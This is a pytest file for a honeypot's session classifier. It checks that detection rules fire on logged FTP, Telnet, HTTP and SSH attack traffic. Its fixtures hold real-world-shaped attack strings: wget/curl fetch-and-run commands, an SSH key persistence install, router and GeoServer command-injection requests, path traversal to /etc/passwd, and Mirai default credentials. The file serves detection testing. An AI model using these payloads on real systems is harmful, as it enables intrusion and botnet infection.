"""Rule-matching coverage for the FTP/Telnet/HTTP-specific rules in
default_rules.yaml, using the exact command strings each real protocol
handler logs (see ftp_handler.py, telnet_handler.py, http_handler.py) --
not synthetic shell commands -- so these tests fail if a handler's log
format ever drifts out of sync with what the rules actually match on."""

import uuid

import pytest

from classifier.pipeline import classify_session
from classifier.schemas.session import SessionRecord


def make_session(protocol, commands, duration_seconds, persona_id="generic_linux"):
    started_at = 100.0
    command_events = [
        {"cmd": cmd, "timestamp": started_at + offset}
        for cmd, offset in commands
    ]
    return SessionRecord.model_validate({
        "schema_version": 1,
        "session_id": str(uuid.uuid4()),
        "protocol": protocol,
        "peer_ip": "203.0.113.7",
        "peer_port": 44321,
        "persona_id": persona_id,
        "started_at": started_at,
        "ended_at": started_at + duration_seconds,
        "duration_seconds": duration_seconds,
        "end_reason": "disconnect",
        "command_count": len(command_events),
        "commands": command_events,
        "decoy_files_surfaced": [],
    })


def test_ftp_banner_probe_with_no_credentials_matches():
    """A scanner that connects and sends garbage instead of USER (or nothing
    recognizable at all) is a banner-grab, not a credential attempt."""
    session = make_session("ftp", [("SYST", 0.5)], duration_seconds=0.5)

    summary = classify_session(session)

    assert "ftp_banner_probe_no_credentials" in summary.matched_rule_ids
    assert "ftp_automated_credential_burst" not in summary.matched_rule_ids


def test_ftp_automated_credential_burst_matches_bot_speed_submission():
    session = make_session(
        "ftp",
        [("USER admin", 0.0), ("PASS admin123", 0.1)],
        duration_seconds=0.1,
    )

    summary = classify_session(session)

    assert "ftp_automated_credential_burst" in summary.matched_rule_ids


def test_ftp_manual_speed_credential_submission_does_not_match_burst_rule():
    """The same USER/PASS pair, submitted at plausible human typing speed,
    must not be flagged as an automated burst -- only authentication_attempt
    (protocol-agnostic) should fire."""
    session = make_session(
        "ftp",
        [("USER admin", 0.0), ("PASS admin123", 8.0)],
        duration_seconds=8.0,
    )

    summary = classify_session(session)

    assert "ftp_automated_credential_burst" not in summary.matched_rule_ids
    assert "authentication_attempt" in summary.matched_rule_ids


def test_telnet_banner_probe_with_no_credentials_matches():
    session = make_session("telnet", [("\xff\xfb\x01", 0.2)], duration_seconds=0.2)

    summary = classify_session(session)

    assert "telnet_banner_probe_no_credentials" in summary.matched_rule_ids


def test_telnet_automated_credential_burst_matches_mirai_style_submission():
    session = make_session(
        "telnet",
        [("login: admin", 0.0), ("password: xc3511", 0.05)],
        duration_seconds=0.05,
    )

    summary = classify_session(session)

    assert "telnet_automated_credential_burst" in summary.matched_rule_ids


def test_mirai_iot_credential_burst_matches_known_default_pair():
    session = make_session(
        "telnet",
        [("login: root", 0.0), ("password: xc3511", 8.0)],
        duration_seconds=8.0,
        persona_id="busybox_router",
    )

    summary = classify_session(session)

    assert "mirai_iot_credential_burst" in summary.matched_rule_ids


def test_mirai_iot_credential_burst_is_case_insensitive():
    session = make_session(
        "telnet",
        [("login: Root", 0.0), ("password: XC3511", 8.0)],
        duration_seconds=8.0,
        persona_id="busybox_router",
    )

    summary = classify_session(session)

    assert "mirai_iot_credential_burst" in summary.matched_rule_ids


def test_non_mirai_credential_pair_does_not_match_iot_rule():
    """An arbitrary (non-wordlist) credential pair should still be caught by
    the generic burst/attempt rules, but not misattributed to Mirai."""
    session = make_session(
        "telnet",
        [("login: alice", 0.0), ("password: hunter2", 0.05)],
        duration_seconds=0.05,
    )

    summary = classify_session(session)

    assert "mirai_iot_credential_burst" not in summary.matched_rule_ids
    assert "telnet_automated_credential_burst" in summary.matched_rule_ids


def test_mirai_default_pair_is_a_commodity_bot_tagged_default_accounts():
    """A device-specific factory password names the actor on its own, even
    when the generic brute_force_bot rules match the same session."""
    session = make_session(
        "telnet",
        [("login: root", 0.0), ("password: xc3511", 0.05)],
        duration_seconds=0.05,
        persona_id="busybox_router",
    )

    summary = classify_session(session, connection_count_from_same_ip=9)

    assert "mirai_iot_credential_burst" in summary.matched_rule_ids
    assert summary.actor_label == "commodity_bot"
    assert "T1078.001" in summary.mitre_tags
    assert summary.intent == "credential_theft"


def test_generic_default_pair_is_brute_force_not_mirai():
    """admin:admin is in every wordlist, so it says nothing about which bot
    sent it -- it stays with the brute-force rules and their fix."""
    session = make_session(
        "telnet",
        [("login: admin", 0.0), ("password: admin", 0.05)],
        duration_seconds=0.05,
        persona_id="busybox_router",
    )

    summary = classify_session(session)

    assert "mirai_iot_credential_burst" not in summary.matched_rule_ids
    assert summary.actor_label == "brute_force_bot"
    assert "T1078.001" not in summary.mitre_tags


def test_http_sensitive_path_probe_matches_env_request():
    session = make_session(
        "http",
        [("GET /.env HTTP/1.1", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_sensitive_path_probe" in summary.matched_rule_ids


def test_http_ordinary_request_does_not_match_sensitive_path_probe():
    session = make_session(
        "http",
        [("GET /index.html HTTP/1.1", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_sensitive_path_probe" not in summary.matched_rule_ids


def test_http_credential_harvest_attempt_matches_login_form_post():
    session = make_session(
        "http",
        [("POST /wp-login.php: log=admin&pwd=hunter2", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_credential_harvest_attempt" in summary.matched_rule_ids


def test_http_post_without_credential_fields_does_not_match_harvest_rule():
    session = make_session(
        "http",
        [("POST /api/contact: message=hello HTTP/1.1", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_credential_harvest_attempt" not in summary.matched_rule_ids


def test_http_basic_auth_header_is_a_credential_submission():
    session = make_session(
        "http",
        [("GET / HTTP/1.1", 0.0), ("Authorization: Basic YWRtaW46c2VjcmV0", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_credential_harvest_attempt" in summary.matched_rule_ids
    assert summary.intent == "credential_theft"


@pytest.mark.parametrize(
    "header",
    [
        # Opening NTLM handshake message: no username or password in it
        "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "Authorization: Bearer sk-test",
        "Authorization: Basic not-base64!",
    ],
)
def test_http_authorization_without_a_password_is_not_a_credential_submission(header):
    """WinRM probes open an NTLM/Negotiate handshake, and API scanners send
    a placeholder Bearer token; neither carries a password."""
    session = make_session(
        "http",
        [("POST /wsman HTTP/1.1", 0.0), (header, 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_credential_harvest_attempt" not in summary.matched_rule_ids
    assert summary.intent != "credential_theft"


def test_http_known_scanner_user_agent_matches_masscan():
    session = make_session(
        "http",
        [("User-Agent: masscan/1.3", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_known_scanner_user_agent" in summary.matched_rule_ids


def test_http_ordinary_browser_user_agent_does_not_match_scanner_rule():
    session = make_session(
        "http",
        [("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 0.1)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_known_scanner_user_agent" not in summary.matched_rule_ids


def test_single_command_matching_no_rule_returns_insufficient_data():
    """A 2-second session with one command that matches nothing has no
    command or timing evidence at all -- that's insufficient_data, not a
    low-confidence guess."""
    session = make_session("tcp_shell", [("ls", 0.0)], duration_seconds=2.0)

    summary = classify_session(session)

    assert summary.matched_rule_ids == []
    assert summary.classification_status == "insufficient_data"
    assert summary.actor_label is None


def test_single_command_matching_a_rule_returns_partial_not_complete():
    """A 2-second session with one command that does match a rule (eg.
    "sqlmap ..." triggering script_kiddie_tool_names) still only carries one
    command's worth of evidence -- classification_status must read
    "partial", not "complete", even though a rule fired and actor_label is
    populated."""
    session = make_session(
        "tcp_shell",
        [("sqlmap -u http://target", 0.0)],
        duration_seconds=2.0,
    )

    summary = classify_session(session)

    assert "script_kiddie_tool_names" in summary.matched_rule_ids
    assert summary.actor_label == "script_kiddie"
    assert summary.classification_status == "partial"


def test_repeat_connections_at_five_matches_brute_force_bot_with_t1110():
    """5+ connections from the same source IP in 24h is the documented
    threshold for repeat_connections_same_ip -- verify the boundary itself,
    not just that the rule exists."""
    session = make_session("tcp_shell", [("whoami", 0.0)], duration_seconds=0.1)

    summary = classify_session(session, connection_count_from_same_ip=5)

    assert "repeat_connections_same_ip" in summary.matched_rule_ids
    assert summary.actor_label == "brute_force_bot"
    assert "T1110" in summary.mitre_tags


def test_repeat_connections_at_four_does_not_match():
    """One connection short of the threshold must not fire the rule."""
    session = make_session("tcp_shell", [("whoami", 0.0)], duration_seconds=0.1)

    summary = classify_session(session, connection_count_from_same_ip=4)

    assert "repeat_connections_same_ip" not in summary.matched_rule_ids


def test_ssh_remote_payload_fetch_and_run_is_high_risk_commodity_bot():
    """A logged-in session that downloads a program and runs it must not be
    rated the same as a password guess: it still matches
    authentication_attempt, but the combined score has to land in "high"."""
    session = make_session(
        "tcp_shell",
        [
            ("login: root", 0.0),
            ("password: admin", 0.0),
            (
                "uname -a; cd /tmp; scp -F sshcfg -i key.ppk dlr@203.0.113.9:sh out_sh; "
                "if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh; "
                "else (wget -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s ssh; fi",
                2.0,
            ),
        ],
        duration_seconds=2.7,
    )

    summary = classify_session(session)

    assert "ssh_remote_payload_fetch_and_run" in summary.matched_rule_ids
    assert "authentication_attempt" in summary.matched_rule_ids
    assert summary.actor_label == "commodity_bot"
    assert "T1105" in summary.mitre_tags
    assert summary.risk_level == "high"


def test_ssh_login_followed_by_a_harmless_command_does_not_match_fetch_and_run():
    session = make_session(
        "tcp_shell",
        [("login: root", 0.0), ("password: admin", 0.0), ('echo -e "\\x6F\\x6B"', 1.0)],
        duration_seconds=1.5,
    )

    summary = classify_session(session)

    assert "ssh_remote_payload_fetch_and_run" not in summary.matched_rule_ids


def test_fetch_and_run_text_over_http_does_not_match_the_ssh_rule():
    session = make_session(
        "http",
        [("POST /goform/set_LimitClient_cfg: x=1;wget http://203.0.113.9/a -O-|sh", 0.0)],
        duration_seconds=0.1,
    )

    summary = classify_session(session)

    assert "ssh_remote_payload_fetch_and_run" not in summary.matched_rule_ids


def test_ssh_authorized_key_install_is_high_risk_commodity_bot():
    """Leaving a login key behind must not be rated the same as a password
    guess, and the generic brute_force_bot rules must not decide its label
    even when the address has reconnected often."""
    session = make_session(
        "tcp_shell",
        [
            ("login: root", 0.0),
            ("password: admin", 0.0),
            (
                "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E example-key' >> /root/.ssh/authorized_keys "
                "&& chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 2>/dev/null",
                2.0,
            ),
        ],
        duration_seconds=2.5,
    )

    summary = classify_session(session, connection_count_from_same_ip=9)

    assert "ssh_authorized_key_install" in summary.matched_rule_ids
    assert "repeat_connections_same_ip" in summary.matched_rule_ids
    assert summary.actor_label == "commodity_bot"
    assert "T1098.004" in summary.mitre_tags
    assert summary.behavior_stage == "persistence"
    assert summary.intent == "persistence"
    assert summary.risk_level == "high"


def test_ssh_login_check_is_medium_risk_brute_force_led_by_password_guessing():
    """A bot that confirms the guessed password with echo and leaves gets
    its own technique, listed ahead of the general brute-force tag so the
    alert leads with the confirmed-password fix."""
    session = make_session(
        "tcp_shell",
        [("login: root", 0.0), ("password: admin", 0.0), (r'echo -e "\x6F\x6B"', 1.0)],
        duration_seconds=1.5,
    )

    summary = classify_session(session, connection_count_from_same_ip=9)

    assert "ssh_login_check" in summary.matched_rule_ids
    assert summary.actor_label == "brute_force_bot"
    assert summary.mitre_tags[0] == "T1110.001"
    assert "T1110" in summary.mitre_tags
    assert summary.intent == "credential_theft"
    assert summary.risk_level == "medium"


def test_echo_followed_by_a_download_does_not_match_the_login_check_rule():
    session = make_session(
        "tcp_shell",
        [
            ("login: root", 0.0),
            ("password: admin", 0.0),
            ("echo OK", 1.0),
            ("cd /tmp; wget -q http://203.0.113.9/bot; chmod +x bot; ./bot", 2.0),
        ],
        duration_seconds=2.5,
    )

    summary = classify_session(session)

    assert "ssh_login_check" not in summary.matched_rule_ids
    assert summary.mitre_tags[0] == "T1105"


def test_reading_authorized_keys_does_not_match_the_key_install_rule():
    session = make_session(
        "tcp_shell",
        [("login: root", 0.0), ("password: admin", 0.0), ("cat ~/.ssh/authorized_keys", 1.0)],
        duration_seconds=1.5,
    )

    summary = classify_session(session)

    assert "ssh_authorized_key_install" not in summary.matched_rule_ids


def test_fetch_and_run_session_reports_payload_delivery_with_repeat_connections():
    session = make_session(
        "tcp_shell",
        [
            ("login: root", 0.0),
            ("password: admin", 0.0),
            ("cd /tmp; wget -q http://203.0.113.9/bot; chmod +x bot; ./bot", 2.0),
        ],
        duration_seconds=2.5,
    )

    summary = classify_session(session, connection_count_from_same_ip=9)

    assert summary.actor_label == "commodity_bot"
    assert summary.intent == "payload_delivery"
    assert summary.risk_level == "high"


def test_ssh_system_binary_read_is_medium_risk_commodity_bot():
    """Printing a program file is a loader learning the CPU type: it gets
    the commodity_bot label even when the address has reconnected often,
    but stays below a download or a planted key."""
    session = make_session(
        "tcp_shell",
        [("login: root", 0.0), ("password: admin", 0.0), ("cat /bin/echo", 1.0)],
        duration_seconds=1.5,
    )

    summary = classify_session(session, connection_count_from_same_ip=9)

    assert "ssh_system_binary_read" in summary.matched_rule_ids
    assert "repeat_connections_same_ip" in summary.matched_rule_ids
    assert summary.actor_label == "commodity_bot"
    assert summary.mitre_tags[0] == "T1082"
    assert summary.risk_level == "medium"
    # Inspecting the system, not stealing credentials
    assert summary.behavior_stage == "discovery"
    assert summary.intent == "reconnaissance"


def test_reading_an_ordinary_file_does_not_match_the_system_binary_rule():
    session = make_session(
        "tcp_shell",
        [("login: root", 0.0), ("password: admin", 0.0), ("cat /etc/hostname", 1.0)],
        duration_seconds=1.5,
    )

    summary = classify_session(session)

    assert "ssh_system_binary_read" not in summary.matched_rule_ids


def test_system_binary_read_over_telnet_does_not_match_the_ssh_rule():
    session = make_session(
        "telnet",
        [("login: root", 0.0), ("password: cat /bin/echo", 0.5)],
        duration_seconds=1.0,
    )

    summary = classify_session(session)

    assert "ssh_system_binary_read" not in summary.matched_rule_ids


# Request shapes below follow what the public sensor captured, with the
# download addresses replaced by documentation addresses.
@pytest.mark.parametrize(
    "lines",
    [
        [
            "POST /goform/set_LimitClient_cfg HTTP/1.1",
            "POST /goform/set_LimitClient_cfg: time1=00:00-00:00&time2=00:00-00:00"
            "&mac=;wget http://198.51.100.7/ok; chmod 777 ok; sh ok; rm -rf ok",
        ],
        [
            "POST /goform/set_LimitClient_cfg HTTP/1.1",
            "POST /goform/set_LimitClient_cfg: time1=00:00-00:00"
            "&mac=%3Bwget%20-qO-%20http%3A%2F%2F198.51.100.7%2Fx.sh%7Csh%26%23",
        ],
        [
            "POST /tmUnblock.cgi HTTP/1.1",
            "POST /tmUnblock.cgi: ttcp_ip=-h+%60busybox+wget+-qO-+http%3A%2F%2F198.51.100.7"
            "%2Fx.sh%7Csh%60&StartEPI=1",
        ],
        [
            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+"
            "http://198.51.100.7:8080/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/ HTTP/1.0",
        ],
        [
            "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue"
            "&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%27id%27) HTTP/1.1",
        ],
        [
            "POST /api/mcp/connect HTTP/1.1",
            'POST /api/mcp/connect: {"serverConfig":{"command":"sh","args":["-c",'
            '"(wget -qO- https://198.51.100.7/sh || curl -sk https://198.51.100.7/sh) | sh"]}}',
        ],
    ],
)
def test_http_command_injection_is_high_risk_payload_delivery(lines):
    session = make_session(
        "http",
        [(line, 0.0) for line in lines],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_command_injection" in summary.matched_rule_ids
    assert summary.actor_label == "commodity_bot"
    assert summary.risk_level == "high"
    assert summary.mitre_tags[0] == "T1190"
    assert summary.intent == "payload_delivery"
    # The check rules stay quiet when the request carries the exploit
    assert "http_geoserver_probe" not in summary.matched_rule_ids
    assert "http_ai_server_probe" not in summary.matched_rule_ids


@pytest.mark.parametrize(
    "lines",
    [
        ["GET / HTTP/1.1", "User-Agent: curl/8.5.0"],
        ["GET /search?q=wget+tutorial HTTP/1.1"],
        ["GET /?tool=curl&x=1 HTTP/1.1"],
        ["POST /contact: message=I+use+curl+and+wget+daily"],
    ],
)
def test_download_tool_names_without_injection_do_not_match(lines):
    session = make_session(
        "http",
        [(line, 0.0) for line in lines],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_command_injection" not in summary.matched_rule_ids


@pytest.mark.parametrize(
    "request_line",
    [
        "GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1",
        "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1",
        "GET /static/..%252f..%252f..%252fetc/passwd HTTP/1.1",
    ],
)
def test_http_path_traversal_is_named_as_exploitation(request_line):
    session = make_session(
        "http",
        [(request_line, 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_path_traversal" in summary.matched_rule_ids
    # One finding for the request, not a secret-file search as well
    assert "http_sensitive_path_probe" not in summary.matched_rule_ids
    assert summary.actor_label == "automated_scanner"
    assert summary.risk_level == "medium"
    assert summary.intent == "vulnerability_exploitation"


def test_single_parent_folder_step_is_not_path_traversal():
    session = make_session(
        "http",
        [("GET /../logon/logon.htm HTTP/1.1", 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_path_traversal" not in summary.matched_rule_ids


@pytest.mark.parametrize(
    "request_line",
    [
        "CONNECT example.com:443 HTTP/1.1",
        "GET http://example.com/judge HTTP/1.1",
    ],
)
def test_http_open_proxy_probe(request_line):
    session = make_session(
        "http",
        [(request_line, 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_open_proxy_probe" in summary.matched_rule_ids
    assert summary.mitre_tags == ["T1090"]
    assert summary.intent == "reconnaissance"


@pytest.mark.parametrize(
    "request_line, rule_id, technique",
    [
        ("GET /SDK/webLanguage HTTP/1.1", "http_hikvision_camera_probe", "T1595.002"),
        ("GET /geoserver/web/ HTTP/1.1", "http_geoserver_probe", "T1595.002"),
        ("GET /mcp HTTP/1.1", "http_ai_server_probe", "T1595.002"),
        ("GET /api/mcp HTTP/1.1", "http_ai_server_probe", "T1595.002"),
        ("GET /sse HTTP/1.1", "http_ai_server_probe", "T1595.002"),
        ("GET /v1/models HTTP/1.1", "http_ai_server_probe", "T1595.002"),
        ("POST /wsman HTTP/1.1", "http_winrm_probe", "T1592"),
    ],
)
def test_http_product_checks_are_low_risk_reconnaissance(request_line, rule_id, technique):
    session = make_session(
        "http",
        [(request_line, 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert rule_id in summary.matched_rule_ids
    assert summary.actor_label == "automated_scanner"
    assert summary.mitre_tags[0] == technique
    assert summary.risk_level == "low"
    assert summary.intent == "reconnaissance"


@pytest.mark.parametrize(
    "request_line",
    ["GET /mcpanel HTTP/1.1", "GET /geoservers HTTP/1.1", "GET /sdk HTTP/1.1"],
)
def test_lookalike_paths_are_not_product_checks(request_line):
    session = make_session(
        "http",
        [(request_line, 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert not {
        "http_hikvision_camera_probe",
        "http_geoserver_probe",
        "http_ai_server_probe",
    } & set(summary.matched_rule_ids)


@pytest.mark.parametrize("scheme", ["NTLM", "Negotiate"])
def test_password_less_windows_signin_is_a_host_information_probe(scheme):
    session = make_session(
        "http",
        [
            ("GET / HTTP/1.1", 0.0),
            (f"Authorization: {scheme} TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAAAAAA", 0.0),
        ],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_windows_signin_probe" in summary.matched_rule_ids
    assert summary.mitre_tags == ["T1592"]
    assert summary.intent == "reconnaissance"


@pytest.mark.parametrize(
    "path",
    ["/.aws/credentials", "/config.json", "/.git-credentials", "/terraform.tfstate",
     "/actuator/env", "/appsettings.json", "/docker-compose.yml", "/secrets.json"],
)
def test_http_secret_file_requests_match_the_sensitive_path_rule(path):
    session = make_session(
        "http",
        [(f"GET {path} HTTP/1.1", 0.0)],
        duration_seconds=0.1,
        persona_id="ubuntu_web_server",
    )

    summary = classify_session(session)

    assert "http_sensitive_path_probe" in summary.matched_rule_ids
